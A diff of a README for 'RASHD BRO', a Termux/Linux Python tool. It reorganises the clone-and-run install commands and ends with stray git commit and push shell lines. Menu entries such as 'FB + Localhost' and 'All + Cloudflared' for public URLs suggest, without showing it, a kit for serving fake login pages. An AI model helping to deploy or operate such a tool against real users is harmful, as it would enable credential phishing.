@@ -1,26 +1,16 @@
 # 🔥 RASHD BRO · Neon Edition v3.0
 
+## ⚡ Quick Install (Copy-Paste)
+```bash
+git clone https://github.com/v4zrashd/RASHD-BRO.git && cd RASHD-BRO && pip install colorama -q && python3 V4Zteem.py
+```
+
+---
+
 > **Developer:** v4zrashd
 > **Platform:** Termux (Android) / Linux
 > **Language:** Python 3.14+
 > **Dependencies:** colorama, cloudflared (optional)
-
----
-
-## 🚀 Full Install & Run (One Command)
-
-### Clone & Install
-```bash
-git clone https://github.com/v4zrashd/RASHD-BRO.git
-cd RASHD-BRO
-pip install colorama -q
-python3 V4Zteem.py
-```
-
-### Run Directly (No Clone)
-```bash
-git clone https://github.com/v4zrashd/RASHD-BRO.git && cd RASHD-BRO && pip install colorama -q && python3 V4Zteem.py
-```
 
 ---
 
@@ -48,11 +38,6 @@ cd RASHD-BRO
 ### Step 4: Install Cloudflared (Optional — For Public URLs)
 ```bash
 pkg install cloudflared -y
-# OR download directly:
-pkg install wget -y
-wget https://github.com/cloudflare/cloudflared/releases/download/v2024.0.1/cloudflared-linux-amd64 -O cloudflared
-chmod +x cloudflared
-mv cloudflared $PREFIX/bin/
 ```
 
 ### Step 5: Run the Tool
@@ -117,7 +102,6 @@ git status                                             # Check status
 ```bash
 python3 V4Zteem.py                                     # Run tool
 pip install colorama -q                                # Install dependency
-pip install -r requirements.txt                        # Install all deps
 python3 -m py_compile V4Zteem.py                       # Check syntax
 ```
 
@@ -125,7 +109,6 @@ python3 -m py_compile V4Zteem.py                       # Check syntax
 ```bash
 pkg update && pkg upgrade -y                           # Update all
 pkg install python -y                                  # Install Python
-pkg install python-pip -y                              # Install pip
 pip install colorama -q                                # Install colorama
 pkg install cloudflared -y                             # Install Cloudflared
 ```
@@ -177,14 +160,6 @@ RASHD-BRO/
 
 ---
 
-## ⚡ Quick Install (Copy-Paste)
-
-```bash
-git clone https://github.com/v4zrashd/RASHD-BRO.git && cd RASHD-BRO && pip install colorama -q && python3 V4Zteem.py
-```
-
----
-
 ## 🔒 Legal Disclaimer
 
 > ⚠️ **WARNING**: This tool is for educational purposes only.
@@ -199,27 +174,3 @@ git clone https://github.com/v4zrashd/RASHD-BRO.git && cd RASHD-BRO && pip insta
 **RASHD BRO · Neon Edition v3.0**
 Developer: v4zrashd
 All rights reserved.
-
----
-
-## 🔗 Quick Reference
-
-| Command | Description |
-|---------|-------------|
-| `python3 V4Zteem.py` | Start the tool |
-| `git clone https://github.com/v4zrashd/RASHD-BRO.git` | Clone repo |
-| `1` → `1` → `1` → Enter | FB + Localhost |
-| `4` → `2` → Enter | All + Cloudflared |
-| `0` → `0` | Exit |
-```
-
-echo "README.md updated!"
-git add README.md
-git commit -m "Update README with full install commands"
-git push origin main 2>&1
-echo "---"
-echo "=== Final check ==="
-git ls-files
-git log --oneline -6
-echo "---"
-echo "✅ DONE!"
